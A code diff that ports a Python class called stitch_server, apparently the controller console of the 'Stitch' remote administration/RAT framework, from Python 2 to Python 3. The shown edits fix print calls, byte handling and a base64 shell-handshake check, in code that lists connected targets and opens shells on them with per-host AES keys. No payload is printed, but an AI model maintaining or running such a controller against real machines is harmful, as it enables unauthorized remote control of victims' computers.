@@ -67,7 +67,7 @@ class stitch_server(cmd.Cmd):
             print_border(len(n),'-')
             print('   User: {}\n   Hostname: {}\n   Listening Port: {}\n'
             '   Operating System: {}\n'.format( n_user, n_hostname, n_port, n_os))
-        print ""
+        print()
 
     def remove_hsection(self,section):
         if section in self.Config.sections():
@@ -132,7 +132,7 @@ class stitch_server(cmd.Cmd):
         return buf
 
     def receive(self,sock,encryption=True):
-        full_response = ""
+        full_response = b""
         while True:
             lengthbuf = self.recvall(sock, 4, encryption=False)
             length, = struct.unpack('!i', lengthbuf)
@@ -141,7 +141,7 @@ class stitch_server(cmd.Cmd):
                 full_response += response
             else:
                 break
-        return full_response
+        return full_response.decode('latin-1')
 
 ################################################################################
 #                           Start of DO Section                                #
@@ -168,7 +168,7 @@ class stitch_server(cmd.Cmd):
         if line != '':
             try:
                 os.chdir(line)
-                print
+                print()
             except Exception as e:
                 st_print("[*] {}\n".format(e))
         else:
@@ -289,12 +289,12 @@ class stitch_server(cmd.Cmd):
                 n_user = '----'
                 n_os = '----------------'
                 n_hostname = '--------'
-            print_cyan ('\n{}'.format(n),)
+            print_cyan ('\n{}'.format(n))
             print_border(len(n),'-')
-            print ('   User: {}\n   Hostname: {}\n'
+            print('   User: {}\n   Hostname: {}\n'
             '   Operating System: {}\n'.format(n_user, n_hostname, n_os))
             i += 1
-        print
+        print()
 
     def do_shell (self,line):
         if len(line.split()) != 1:
@@ -308,7 +308,7 @@ class stitch_server(cmd.Cmd):
                 del self.inf_port[self.target]
                 try:
                     st_confirm = self.receive(self.conn,encryption=False)
-                    if st_confirm == base64.b64encode('stitch_shell'):
+                    if st_confirm == base64.b64encode(b'stitch_shell').decode():
                         conn_aes = self.receive(self.conn,encryption=False)
                         if conn_aes in self.aes_lib.sections():
                             self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
@@ -439,7 +439,7 @@ class stitch_server(cmd.Cmd):
         return True
 
     def do_EOF(self, line):
-        print
+        print()
         return self.do_exit(line)
 
 ################################################################################
